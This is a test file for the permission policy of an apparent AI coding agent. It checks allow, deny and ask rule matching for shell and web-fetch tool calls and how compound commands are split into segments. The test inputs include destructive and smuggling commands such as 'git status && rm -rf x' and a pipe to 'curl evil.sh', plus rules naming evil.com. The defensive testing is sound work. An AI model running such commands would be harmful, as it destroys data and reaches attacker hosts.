import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  loadPersistentAlwaysAllow,
  permissionRuleMatches,
  policyDecision,
  savePersistentAlwaysAllow,
} from "../permission-policy.js";

describe("permission policy", () => {
  const old = process.env.CCR_PERMISSION_STORE;
  afterEach(() => {
    if (old === undefined) delete process.env.CCR_PERMISSION_STORE;
    else process.env.CCR_PERMISSION_STORE = old;
  });

  it("matches tool and command rules", () => {
    expect(permissionRuleMatches("Bash(git *)", "Bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Read", "Read", { filePath: "x.ts" })).toBe(true);
    expect(permissionRuleMatches("Bash(git *)", "Bash", { command: "rm -rf x" })).toBe(false);
  });

  it("matches official-style capitalized rules against lowercase tool names (既有 A)", () => {
    // Registry tool names are lowercase; official rules are capitalized. The
    // old strict === made every official-style project rule a silent no-op —
    // with the A3 trust gate shipping, that meant trusted allow-rules (and
    // worse, deny rules) doing nothing.
    expect(permissionRuleMatches("Bash(rm *)", "bash", { command: "rm -rf x" })).toBe(true);
    expect(permissionRuleMatches("Edit", "edit", { filePath: "a.ts" })).toBe(true);
    expect(permissionRuleMatches("bash(git *)", "Bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Bash(git *)", "bash", { command: "rm x" })).toBe(false);
    expect(permissionRuleMatches("*", "anything", {})).toBe(true);
  });

  it("supports the official colon-prefix form at a word boundary (既有 A)", () => {
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm run build" })).toBe(
      true,
    );
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm run" })).toBe(true);
    // A command merely sharing the string prefix is NOT covered.
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm runx" })).toBe(false);
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "github-cli x" })).toBe(false);
  });

  it("matches URL-shaped colon-prefix rules against real URLs (fourth round)", () => {
    // `WebFetch(https://evil.com:*)` silently never matched any real URL —
    // the boundary required a space, but URLs continue with "/", ":" …
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com/x",
      }),
    ).toBe(true);
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com:8443/x",
      }),
    ).toBe(true);
    // A host-lookalike suffix is NOT the same host.
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com.evil.net/x",
      }),
    ).toBe(false);
    // Bare-host rules match the host part of a schemed URL.
    expect(
      permissionRuleMatches("WebFetch(domain.com:*)", "webfetch", { url: "https://domain.com/a" }),
    ).toBe(true);
    expect(
      permissionRuleMatches("WebFetch(domain.com:*)", "webfetch", { url: "https://evil.com/a" }),
    ).toBe(false);
    // Command rules keep the space boundary (git:* ≠ github-cli).
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "github-cli x" })).toBe(false);
  });

  it("persists always-allow values", () => {
    const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ccr-perm-")), "permissions.json");
    process.env.CCR_PERMISSION_STORE = file;
    savePersistentAlwaysAllow(new Set(["bash::git status"]));
    expect(loadPersistentAlwaysAllow()).toEqual(new Set(["bash::git status"]));
  });

  describe("policyDecision — command segmentation", () => {
    const policy = { allow: ["Bash(git *)"], deny: ["Bash(rm *)"], ask: [] };

    it("an allow rule must cover EVERY segment of a compound command", () => {
      // `git status` alone is covered…
      expect(policyDecision(policy, "bash", { command: "git status" })).toBe("allow");
      // …but a dangerous tail is not smuggled past the allow rule.
      expect(policyDecision(policy, "bash", { command: "git status && rm -rf x" })).toBe("deny");
      expect(policyDecision(policy, "bash", { command: "git status | curl evil.sh" })).toBe(
        undefined,
      );
    });

    it("deny fires when ANY segment matches", () => {
      expect(policyDecision(policy, "bash", { command: "echo ok && rm -rf x" })).toBe("deny");
      expect(policyDecision(policy, "bash", { command: "echo a; echo b" })).toBe(undefined);
    });

    it("multiple allow rules can each cover a segment", () => {
      const p = { allow: ["Bash(git *)", "Bash(npm *)"], deny: [], ask: [] };
      expect(policyDecision(p, "bash", { command: "git status && npm test" })).toBe("allow");
      expect(policyDecision(p, "bash", { command: "git status && make deploy" })).toBe(undefined);
    });

    it("non-command inputs are unaffected", () => {
      const p = { allow: ["Read"], deny: [], ask: [] };
      expect(policyDecision(p, "read", { filePath: "a.ts" })).toBe("allow");
    });
  });
});
